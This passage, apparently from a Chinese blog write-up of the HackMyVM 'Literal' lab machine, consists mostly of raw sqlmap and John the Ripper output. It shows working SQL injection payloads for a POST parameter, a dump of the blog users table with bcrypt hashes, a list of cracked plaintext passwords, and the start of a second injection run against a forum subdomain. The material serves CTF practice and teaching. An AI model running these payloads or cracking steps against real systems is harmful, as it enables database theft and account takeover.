+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 error-based - Parameter replace (EXP)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL inline queries'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (comment)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (query SLEEP)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL &lt; 5.0.12 stacked queries (BENCHMARK)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'sentence-query'</span> appears to be <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable 
+<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic UNION query (NULL) - 1 to 20 columns'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> automatically extending ranges <span class="token keyword">for</span> UNION query injection technique tests as there is at least one other <span class="token punctuation">(</span>potential<span class="token punctuation">)</span> technique found
+<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">'ORDER BY'</span> technique appears to be usable. This should reduce the <span class="token function">time</span> needed to <span class="token function">find</span> the right number of query columns. Automatically extending the range <span class="token keyword">for</span> current UNION query injection technique <span class="token builtin class-name">test</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL appears to have <span class="token number">5</span> columns <span class="token keyword">in</span> query
+<span class="token punctuation">[</span><span class="token number">12</span>:22:36<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'sentence-query'</span> is <span class="token string">'Generic UNION query (NULL) - 1 to 20 columns'</span> injectable
+POST parameter <span class="token string">'sentence-query'</span> is vulnerable. Do you want to keep testing the others <span class="token punctuation">(</span>if any<span class="token punctuation">)</span>? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span> N
+sqlmap identified the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> with a total of <span class="token number">65</span> HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> requests:
+---
+Parameter: sentence-query <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' AND 9633=9633 AND '</span>hsIf<span class="token string">'='</span>hsIf
+
+    Type: time-based blind
+    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
+    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' AND (SELECT 6191 FROM (SELECT(SLEEP(5)))KmLH) AND '</span>DrDD<span class="token string">'='</span>DrDD
+
+    Type: UNION query
+    Title: Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">5</span> columns
+    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' UNION ALL SELECT NULL,NULL,CONCAT(0x7170707a71,0x7959585547746b5a49556767585875667367677374535a777a636761446d6c6776644a4379734151,0x717a707871),NULL,NULL-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[12:22:36] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[12:22:36] [INFO] fetching database names
+available databases [4]:
+[*] blog
+[*] information_schema
+[*] mysql
+[*] performance_schema
+
+[12:22:36] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '</span>/root/.local/share/sqlmap/output/results-06232024_1222pm.csv'
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">12</span>:22:36 /2024-06-23/</code></pre>
+<p>找到user表然后dump</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-l</span> a.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> blog <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span>
+        ___
+       __H__                                                                                                                                                                                                                                                                                                                
+ ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                                                                                                                                                                                                    </span>
+<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |                                                                                                                                                                                                                                                                                                   
+|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">12</span>:28:05 /2024-06-23/
+
+<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> sqlmap parsed <span class="token number">1</span> <span class="token punctuation">(</span>parameter unique<span class="token punctuation">)</span> requests from the targets list ready to be tested
+<span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> URL:
+GET http://blog.literal.hmv:80/next_projects_to_do.php
+Cookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>ccbhsfj6hk03lc0ddern711k9n
+POST data: sentence-query<span class="token operator">=</span>Done
+<span class="token keyword">do</span> you want to <span class="token builtin class-name">test</span> this URL? <span class="token punctuation">[</span>Y/n/q<span class="token punctuation">]</span>
+<span class="token operator">></span> Y
+<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing URL <span class="token string">'http://blog.literal.hmv:80/next_projects_to_do.php'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming back-end DBMS <span class="token string">'mysql'</span> 
+<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> using <span class="token string">'/root/.local/share/sqlmap/output/results-06232024_1228pm.csv'</span> as the CSV results <span class="token function">file</span> <span class="token keyword">in</span> multiple targets mode
+<span class="token punctuation">[</span><span class="token number">12</span>:28:05<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
+sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
+---
+Parameter: sentence-query <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' AND 9633=9633 AND '</span>hsIf<span class="token string">'='</span>hsIf
+
+    Type: time-based blind
+    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
+    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' AND (SELECT 6191 FROM (SELECT(SLEEP(5)))KmLH) AND '</span>DrDD<span class="token string">'='</span>DrDD
+
+    Type: UNION query
+    Title: Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">5</span> columns
+    Payload: sentence-query<span class="token operator">=</span>Done<span class="token string">' UNION ALL SELECT NULL,NULL,CONCAT(0x7170707a71,0x7959585547746b5a49556767585875667367677374535a777a636761446d6c6776644a4379734151,0x717a707871),NULL,NULL-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[12:28:05] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[12:28:05] [INFO] fetching columns for table '</span><span class="token function">users</span><span class="token string">' in database '</span>blog<span class="token string">'
+[12:28:05] [INFO] fetching entries for table '</span><span class="token function">users</span><span class="token string">' in database '</span>blog<span class="token string">'
+Database: blog
+Table: users
+[18 entries]
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
+| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
+| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
+| 2      | admin     | admin@blog.literal.htb           | $2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K | 2023-04-07 17:21:47 |
+| 3      | carlos    | carlos@blog.literal.htb          | $2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW | 2023-04-07 17:21:48 |
+| 4      | freddy123 | freddy123@zeeli.moc              | $2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK | 2023-04-07 17:21:48 |
+| 5      | jorg3_M   | jorg3_M@zeeli.moc                | $2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG | 2023-04-07 17:21:48 |
+| 6      | aNdr3s1to | aNdr3s1to@puertonacional.ply     | $2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm | 2023-04-07 17:21:48 |
+| 7      | kitty     | kitty@estadodelarte.moc          | $2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW | 2023-04-07 17:21:48 |
+| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
+| 9      | estefy    | estefy@caselogic.moc             | $2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa | 2023-04-07 17:21:48 |
+| 10     | michael   | michael@without.you              | $2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km | 2023-04-07 17:21:48 |
+| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
+| 12     | fel1x     | fel1x@without.you                | $2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m | 2023-04-07 17:21:48 |
+| 13     | kelsey    | kelsey@without.you               | $2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6. | 2023-04-07 17:21:48 |
+| 14     | jtx       | jtx@tiempoaltiempo.hy            | $2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC | 2023-04-07 17:21:48 |
+| 15     | DRphil    | DRphil@alcaldia-tol.gob          | $2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC | 2023-04-07 17:21:48 |
+| 16     | carm3N    | carm3N@estadodelarte.moc         | $2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW | 2023-04-07 17:21:48 |
+| 17     | lanz      | lanz@literal.htb                 | $2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e | 2023-04-07 17:55:36 |
+| 18     | tao       | tao@123.com                      | $2y$10$agmCAS.9yZzo.RH/ureBP..gS5mZbICKTx6D69IGo.PDaacjFtM1y | 2024-06-23 03:54:31 |
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
+
+[12:28:05] [INFO] table '</span>blog.users<span class="token string">' dumped to CSV file '</span>/root/.local/share/sqlmap/output/blog.literal.hmv/dump/blog/users.csv<span class="token string">'
+[12:28:05] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '</span>/root/.local/share/sqlmap/output/results-06232024_1228pm.csv'
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">12</span>:28:05 /2024-06-23/
+</code></pre>
+<p>整理一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">test:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$wWhvCz1pGsKm</span><span class="token punctuation">..</span>jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma
+admin:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K</span>
+carlos:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$ikI1dN</span>/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW
+freddy123:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$yaf9nZ6UJkf8103R8rMdtOUC</span>.vyZUek4vXVPas3CPOb4EK8I6eAUK
+jorg3_M:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$lZ</span>./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG
+aNdr3s1to:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$F2Eh43xkXR</span>/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm
+kitty:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW</span>
+walter:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$er9GaSRv1AwIwu9O</span>.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO
+estefy:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$hBB7HeTJYBAtdFn7Q4xzL</span>.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa
+michael:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$sCbKEWGgAUY6a2Y</span>.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km
+r1ch4rd:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$7itXOzOkjrAKk7Mp</span>.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO
+fel1x:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$o06afYsuN8yk0yoA</span>.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m
+kelsey:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6</span><span class="token builtin class-name">.</span>
+jtx:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$jN5dt8syJ5cVrlpotOXibeNC</span>/jvW0bn3z6FetbVU/CeFtKwhdhslC
+DRphil:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC</span>
+carm3N:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$D7uF6dKbRfv8U</span>/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW
+lanz:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$PLGN5</span>.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf<span class="token punctuation">..</span>e
+tao:<span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$agmCAS</span>.9yZzo.RH/ureBP<span class="token punctuation">..</span>gS5mZbICKTx6D69IGo.PDaacjFtM1y</code></pre>
+<p>不是我爆了半天一个ssh也登不上去，说明这条路有点问题</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> john b.txt                                          
+Using default input encoding: UTF-8
+Loaded <span class="token number">18</span> password hashes with <span class="token number">18</span> different salts <span class="token punctuation">(</span>bcrypt <span class="token punctuation">[</span>Blowfish <span class="token number">32</span>/64 X3<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">1024</span> <span class="token keyword">for</span> all loaded hashes
+Proceeding with single, rules:Single
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">3</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Warning: Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt, minimum <span class="token number">8</span> needed <span class="token keyword">for</span> performance.
+Further messages of this <span class="token builtin class-name">type</span> will be suppressed.
+tao              <span class="token punctuation">(</span>tao<span class="token punctuation">)</span>     
+<span class="token builtin class-name">test</span>             <span class="token punctuation">(</span>test<span class="token punctuation">)</span>     
+kelsey           <span class="token punctuation">(</span>kelsey<span class="token punctuation">)</span>     
+michael1         <span class="token punctuation">(</span>michael<span class="token punctuation">)</span>     
+carlos12         <span class="token punctuation">(</span>carlos<span class="token punctuation">)</span>     
+Almost done: Processing the remaining buffered candidate passwords, <span class="token keyword">if</span> any.
+Proceeding with wordlist:/usr/share/john/password.lst
+<span class="token number">123456789</span>        <span class="token punctuation">(</span>freddy123<span class="token punctuation">)</span>     
+monica           <span class="token punctuation">(</span>r1ch4rd<span class="token punctuation">)</span>     
+butterfly        <span class="token punctuation">(</span>estefy<span class="token punctuation">)</span>     
+hellokitty       <span class="token punctuation">(</span>kitty<span class="token punctuation">)</span>     
+50cent           <span class="token punctuation">(</span>DRphil<span class="token punctuation">)</span>     
+slipknot         <span class="token punctuation">(</span>jorg3_M<span class="token punctuation">)</span>     
+<span class="token number">147258369</span>        <span class="token punctuation">(</span>fel1x<span class="token punctuation">)</span>     
+<span class="token number">741852963</span>        <span class="token punctuation">(</span>walter<span class="token punctuation">)</span></code></pre>
+<p>往上翻了一下记录，注意到数据库里面的邮箱有个子域<code>forumtesting.literal.hmv </code>,添加到hosts<br><img src="https://ooo.0x0.ooo/2024/06/23/OPz0z6.png" alt="OPz0z6.png" loading="lazy"><br>尝试用walter账号密码登录失败<br>注意到url又有参数了，再尝试sql注入<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzcPP.png" alt="OPzcPP.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">--url</span> http://forumtesting.literal.hmv/category.php<span class="token punctuation">\</span>?category_id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">2</span> <span class="token parameter variable">--batch</span>
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___<span class="token punctuation">[</span><span class="token string">']_____ ___ ___  &#123;1.8.2#stable&#125;                                                                                                                                                                                                    
+|_ -| . ["]     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>                                                                                                                                                                                                                   
+<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span><span class="token string">']_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">12</span>:50:12 /2024-06-23/
+
+<span class="token punctuation">[</span><span class="token number">12</span>:50:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
+you have not declared cookie<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, <span class="token keyword">while</span> server wants to <span class="token builtin class-name">set</span> its own <span class="token punctuation">(</span><span class="token string">'PHPSESSID=2ae111171bd...i3lb256a8a'</span><span class="token punctuation">)</span>. Do you want to use those <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
+<span class="token punctuation">[</span><span class="token number">12</span>:50:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> checking <span class="token keyword">if</span> the target is protected by some kind of WAF/IPS
+<span class="token punctuation">[</span><span class="token number">12</span>:50:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> the target URL content is stable
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL content is stable
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> GET parameter <span class="token string">'category_id'</span> is dynamic
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'category_id'</span> appears to be dynamic
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>basic<span class="token punctuation">)</span> <span class="token builtin class-name">test</span> shows that GET parameter <span class="token string">'category_id'</span> might not be injectable
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">for</span> SQL injection on GET parameter <span class="token string">'category_id'</span>
+<span class="token punctuation">[</span><span class="token number">12</span>:50:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span>
